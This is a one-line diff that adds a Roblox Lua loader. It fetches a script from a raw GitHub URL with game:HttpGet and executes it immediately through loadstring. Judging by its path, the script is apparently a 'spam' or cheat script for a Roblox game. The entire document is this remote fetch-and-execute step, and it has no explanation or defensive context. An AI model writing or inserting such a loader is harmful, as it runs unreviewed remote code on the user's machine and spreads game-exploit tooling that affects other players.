@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/sell-fries-anomaly-spam1-b46d0rl0odhm9t.lua"))()
